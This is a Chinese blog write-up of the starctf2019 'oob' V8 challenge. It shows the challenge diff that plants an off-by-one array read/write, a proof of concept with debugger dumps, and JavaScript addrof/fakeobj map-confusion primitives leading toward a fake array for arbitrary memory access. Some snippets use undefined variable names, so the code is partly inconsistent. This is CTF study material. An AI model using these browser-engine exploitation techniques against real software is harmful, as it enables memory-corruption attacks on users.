<!DOCTYPE html>
<!--[if lte IE 8 ]>
<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<!--
***************  *      *     *
      8          *    *       *
      8          *  *         *
      8          **           *
      8          *  *         *
      8          *    *       *
      8          *      *     *
      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
<!--<![endif]-->

<head>
  <title>starctf oob | Niko&#39;s BLOG</title>
  <!-- Meta data -->
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="generator" content="Niko's BLOG">
    <meta name="author" content="N1ko">
    <meta name="description" content="" />
    <meta name="keywords" content="逆向,程序分析,漏洞挖掘" />

    <!-- Favicon, (keep icon in root folder) -->
    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">

    <link rel="alternate" href="/atom.xml" title="Niko&#39;s BLOG" type="application/atom+xml">
    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
    
    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
    

    <!--[if IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
    <![endif]-->

    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
    <script src="/js/jquery-1.11.1.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>

    <!-- Load these in the <head> for quicker IE8+ load times -->
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="/js/html5shiv.min.js"></script>
    <script src="/js/respond.min.js"></script>
    <![endif]-->

  
  
  

  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
</head>

<!--
<body class="post-template">
-->
<body id="index" class="lightnav animsition">

      <!-- ============================ Off-canvas navigation =========================== -->

    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
            <img src="/img/close.png" alt="Close"/>
        </div>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu">
            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
            <!-- Dropdown Menu -->
			 
            
        	<li>
        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
            	<ul class="sb-submenu">
				  	
				    <li><a href="/categories/Android/" class="animsition-link">Android<small>(7)</small></a></li>
				    
				    <li><a href="/categories/Browser/" class="animsition-link">Browser<small>(1)</small></a></li>
				    
				    <li><a href="/categories/DBI/" class="animsition-link">DBI<small>(1)</small></a></li>
				    
				    <li><a href="/categories/Linux/" class="animsition-link">Linux<small>(1)</small></a></li>
				    
				    <li><a href="/categories/learn/" class="animsition-link">learn<small>(1)</small></a></li>
				    
				    <li><a href="/categories/tools/" class="animsition-link">tools<small>(3)</small></a></li>
				    
				    <li><a href="/categories/游戏/" class="animsition-link">游戏<small>(1)</small></a></li>
				    
				    <li><a href="/categories/论文/" class="animsition-link">论文<small>(1)</small></a></li>
				    
				    <li><a href="/categories/逆向/" class="animsition-link">逆向<small>(1)</small></a></li>
				    
				</ul>
        	</li>
			
            
            <li>
                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                    <li><a href="http://go.kieran.top/" target="_blank" rel="noopener" class="animsition-link">Kieran</a></li>
                    
                </ul>
            </li>
            
        </ul>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu secondary">
            
            <li><a href="/about/index.html" class="animsition-link" title="about">About</a></li>
            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
        </ul>
    </div>
    
    <!-- ============================ END Off-canvas navigation =========================== -->

    <!-- ============================ #sb-site Main Page Wrapper =========================== -->

    <div id="sb-site">
        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->

        <!-- ============================ Header & Logo bar =========================== -->

        <div id="navigation" class="navbar navbar-fixed-top">
            <div class="navbar-inner">
                <div class="container">
                    <!-- Nav logo -->
                    <div class="logo">
                        <a href="/" title="Logo" class="animsition-link">
                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
                        </a>
                    </div>
                    <!-- // Nav logo -->
                    <!-- Info-bar -->
                    <nav>
                        <ul class="nav">
                            <li><a href="/" class="animsition-link">Niko's BLOG</a></li>
                            <li class="nolink"><span>Always </span>Creative.</li>
                            
                            <li><a href="https://github.com/tinyniko" title="Github" target="_blank"><i class="icon-github"></i></a></li>
                            
                            
                            <li><a href="https://twitter.com/nikos233__" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
                            
                            
                            
                            
                            <li class="nolink"><span>Welcome!</span></li>
                        </ul>
                    </nav>
                    <!--// Info-bar -->
                </div>
                <!-- // .container -->
                <div class="learnmore sb-toggle-right">More</div>
                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar before"></span>
                <span class="icon-bar main"></span>
                <span class="icon-bar after"></span>
                </button>
            </div>
            <!-- // .navbar-inner -->
        </div>

        <!-- ============================ Header & Logo bar =========================== -->


      
<section id="intro">
    <div class="container">
        <div class="row col-md-offset-2">
            <div class="col-md-8">
    			<span class="post-meta">
      <time datetime="2021-06-19T03:04:03.000Z" itemprop="datePublished">
          2021-06-19
      </time>
    
    
    | 
    <a href='/tags/exploit/'>exploit</a>,
    
    <a href='/tags/ctf/'>ctf</a>,
    
    <a href='/tags/Browser/'>Browser</a>
    
    
</span>
                <h1>starctf oob</h1>
            </div>
        </div>
        <div class="col-md-8 col-md-offset-2">
      		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这题是starctf2019 oob 的v8漏洞利用题。</p>
<h1 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h1><p>从网上的博客里拿到了v8 的diff 文件，按照对应的命令进行patch 和 编译，编译的命令和diff 代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">git apply &lt; oob.diff</span><br><span class="line"># 同步模块</span><br><span class="line">gclient sync</span><br><span class="line"># 编译debug版本</span><br><span class="line">tools&#x2F;dev&#x2F;v8gen.py x64.debug &amp;&amp; ninja -C out.gn&#x2F;x64.debug d8</span><br><span class="line"># 编译release版本</span><br><span class="line">tools&#x2F;dev&#x2F;v8gen.py x64.release &amp;&amp; ninja -C out.gn&#x2F;x64.release d8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  &#x2F;&#x2F; namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len &#x3D; args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len &#x3D;&#x3D; 1)&#123;</span><br><span class="line">+        &#x2F;&#x2F;read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        &#x2F;&#x2F;write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   &#x2F;* https:&#x2F;&#x2F;tc39.github.io&#x2F;proposal-flatMap&#x2F;#sec-Array.prototype.flatMap *&#x2F;   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   &#x2F;* ArrayBuffer *&#x2F;                                                            \</span><br><span class="line">   &#x2F;* ES #sec-arraybuffer-constructor *&#x2F;                                        \</span><br><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;typer.cc b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     &#x2F;&#x2F; ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>

<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从上面的diff 文件可以看到， 新加了一个array的方法叫 <code>oob</code>， 代码中的len 代表了这个oob 方法的入参个数， 如果没有参数就是读操作，其他就是写操作。 代码的问题在于读写的<code>length</code> 出了问题，正常访问数组的最后一个元素，它的长度应该是length - 1, 相当于这里直接变成了越界读写数组后一位。</p>
<p>在TypedArray 中，array的结构体如下（不确定不同版本会不会有变化）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  elements  ----&gt; +------------------------+</span><br><span class="line">                  |          map           +&lt;---------+</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      length            |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 1         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 2         |          |</span><br><span class="line">                  |      ......            |          |</span><br><span class="line">                  |      element n         |          |</span><br><span class="line">ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                  |      map               |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      prototype         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      elements          |          |</span><br><span class="line">                  |                        +----------+</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      length            |</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      properties        |</span><br><span class="line">                  +------------------------+</span><br></pre></td></tr></table></figure>

<p>当我们创建一个TypedArray的时候， 实际上是返回了一个ArrayObject 的指针， 这个Object中， map 指向的是这个Object的类型， prototype 指向的是非索引元素， elements 指向索引元素（也就是说可以用数字下标访问），length 代表了数组的长度，但这个length 是SMI 结构的。 properties暂时不太了解。</p>
<p>elements 也有一个类型map和数组长度，后面跟的就是数据了。<br>根据代码来看，越界读写的数据是ArrayObject 的 map 字段。</p>
<p>我们可以先试着写poc 看一下运行时数据:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; .&#x2F;d8 --allow-natives-syntax poc.js</span><br><span class="line">var a &#x3D; [1.1, 2.2];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">console.log(a.oob());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(233);</span><br><span class="line">%DebugPrint(a)</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;0x2575a884ddf1 &lt;JSArray[2]&gt;</span><br><span class="line">&#x2F;&#x2F;1.10384958320906e-310</span><br><span class="line">&#x2F;&#x2F;Trace&#x2F;breakpoint trap (core dumped)</span><br></pre></td></tr></table></figure>

<p>debug 版本会用DCHECK 确认array 的长度是否越界，所以没法直接触发。<br>release 的版本，DebugPrint 并没有提供太多的有用信息，只能gdb 调试了。</p>
<p>读别人的博客时发现，编辑out.gn/x64.release/args.gn，打开开关就可以打印信息了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v8_enable_backtrace &#x3D; true</span><br><span class="line">v8_enable_disassembler &#x3D; true</span><br><span class="line">v8_enable_object_print &#x3D; true</span><br><span class="line">v8_enable_verify_heap &#x3D; true</span><br></pre></td></tr></table></figure>



<p>启动gdb 调试后， 由于我们知道ArrayObject的地址，我们可以根据这个结构体，直接找到elements 所在的位置，然后 telescope 看一下具体的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x38b208ecddf8</span><br><span class="line">00:0000│   0x38b208ecddf8 —▸ 0x2afdf0dc14f9 ◂— 0x2afdf0dc01</span><br><span class="line">01:0008│   0x38b208ecde00 ◂— 0x200000000</span><br><span class="line">02:0010│   0x38b208ecde08 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│   0x38b208ecde10 ◂— 0x400199999999999a</span><br><span class="line">04:0020│   0x38b208ecde18 —▸ 0x120242b02ed9 ◂— 0x400002afdf0dc01</span><br><span class="line">05:0028│   0x38b208ecde20 —▸ 0x2afdf0dc0c71 ◂— 0x2afdf0dc08</span><br><span class="line">06:0030│   0x38b208ecde28 —▸ 0x38b208ecddf9 ◂— 0x2afdf0dc14</span><br><span class="line">07:0038│   0x38b208ecde30 ◂— 0x200000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x38b208ecddf8</span><br><span class="line">00:0000│        0x38b208ecddf8 —▸ 0x2afdf0dc14f9 ◂— 0x2afdf0dc01</span><br><span class="line">01:0008│        0x38b208ecde00 ◂— 0x200000000</span><br><span class="line">02:0010│        0x38b208ecde08 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│        0x38b208ecde10 ◂— 0x400199999999999a</span><br><span class="line">04:0020│ rbx-1  0x38b208ecde18 ◂— 0x406d200000000000</span><br><span class="line">05:0028│        0x38b208ecde20 —▸ 0x2afdf0dc0c71 ◂— 0x2afdf0dc08</span><br><span class="line">06:0030│        0x38b208ecde28 —▸ 0x38b208ecddf9 ◂— 0x2afdf0dc14</span><br><span class="line">07:0038│        0x38b208ecde30 ◂— 0x200000000</span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x20ecdd2cde08</span><br><span class="line">$1 &#x3D; 1.1000000000000001</span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x20ecdd2cde10</span><br><span class="line">$2 &#x3D; 2.2000000000000002</span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x20ecdd2cde18</span><br><span class="line">$3 &#x3D; 233</span><br><span class="line">&#x2F;&#x2F; 也可以p&#x2F;f addr</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>结果可以看到，ArrayObject 的map 字段被修改了，也就是说这题考察如果map 相关的利用知识，这就触及到我知识的盲区了。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>map 代表了对象的类型，如果能将不同类型的对象进行修改，就能够达到类型混淆的作用，这个类型混淆利用可以参考以下这就话：</p>
<blockquote>
<p>如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了. 造成上面的原因在于，v8完全依赖Map类型对js对象进行解析</p>
</blockquote>
<p>具体的操作如下：</p>
<p>计算一个对象的地址addressOf：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。</p>
<p>将一个内存地址伪造为一个对象fakeObject：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。</p>
<p>具体利用代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> farray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> uarray = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">         farray[<span class="number">0</span>] = f;</span><br><span class="line">         <span class="keyword">return</span> [uarray[<span class="number">0</span>],uarray[<span class="number">1</span>]]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">lo,hi</span>) </span>&#123;</span><br><span class="line">         uarray[<span class="number">0</span>] = lo;</span><br><span class="line">         uarray[<span class="number">1</span>] = hi;</span><br><span class="line">         <span class="keyword">return</span> farray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> temp_obj = &#123;<span class="string">"A"</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_arr = [temp_obj];</span><br><span class="line"><span class="keyword">var</span> fl_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="keyword">var</span> map1 = obj_arr.oob();</span><br><span class="line"><span class="keyword">var</span> map2 = fl_arr.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = in_obj;</span><br><span class="line">    obj_arr.oob(map2);</span><br><span class="line">    <span class="keyword">let</span> addr = obj_arr[<span class="number">0</span>];</span><br><span class="line">    obj_arr.oob(map1);</span><br><span class="line">    <span class="keyword">return</span> ftoi(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    float_arr[<span class="number">0</span>] = itof(addr);</span><br><span class="line">    float_arr.oob(obj_arr_map);</span><br><span class="line">    <span class="keyword">let</span> fake = float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.oob(float_arr_map);</span><br><span class="line">    <span class="keyword">return</span> fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了这两个方法之后，我们希望能够将其转化为任意地址读写。根据上一篇博客，我们知道有2个地方可以让我们操作， 一个是TypedArray的elements 地址， 一个是ArrayBuffer 的backing_store.</p>
<p>在这题里面，我们只要伪造一个TypedArray 对象就行，然后对这个TypedArray 进行读写操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var fake_array &#x3D; [</span><br><span class="line">	float_array_map,</span><br><span class="line">	u2f(0n),</span><br><span class="line">	u2f(0x41414141n),</span><br><span class="line">	u2f(0x1000000000n),</span><br><span class="line">	1.1,</span><br><span class="line">	2.2,</span><br><span class="line">	];</span><br><span class="line"></span><br><span class="line">%DebugPrint(fake_array);</span><br><span class="line">var fake_array_addr &#x3D; addressOf(fake_array);</span><br><span class="line"></span><br><span class="line">console.log(&quot;fake_array: &quot; + hex(fake_array_addr));</span><br><span class="line">%SystemBreak();</span><br><span class="line">var fake_object_addr &#x3D; fake_array_addr - 0x40n + 0x10n;</span><br><span class="line">%DebugPrint(fake_object_addr)</span><br><span class="line">var fake_object &#x3D; fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x2f087e94f7c0-0x40 0x80</span><br><span class="line">00:0000│   0x2f087e94f780 —▸ 0x3857956c14f9 ◂— 0x3857956c01</span><br><span class="line">01:0008│   0x2f087e94f788 ◂— 0x600000000</span><br><span class="line">02:0010│   0x2f087e94f790 —▸ 0x142c8a8c2ed9 ◂— 0x400003857956c01</span><br><span class="line">03:0018│   0x2f087e94f798 ◂— 0x0</span><br><span class="line">04:0020│   0x2f087e94f7a0 ◂— 0x41414141 &#x2F;* &#39;AAAA&#39; *&#x2F;</span><br><span class="line">05:0028│   0x2f087e94f7a8 ◂— 0x1000000000</span><br><span class="line">06:0030│   0x2f087e94f7b0 ◂— 0x3ff199999999999a</span><br><span class="line">07:0038│   0x2f087e94f7b8 ◂— 0x400199999999999a</span><br><span class="line">08:0040│   0x2f087e94f7c0 —▸ 0x142c8a8c2ed9 ◂— 0x400003857956c01</span><br></pre></td></tr></table></figure>
<p>这里有个比较有意思的现象，fake_array 里如果不加1.1，2.2 就会执行失败，因为是结构体没有伪造号导致的。</p>
<p>之后对这个fake_obj 进行操作就可以了，因为里面的数据是完全可控的。<br>另外fake_array 也可以构造成ArrayBuffer 的格式。</p>
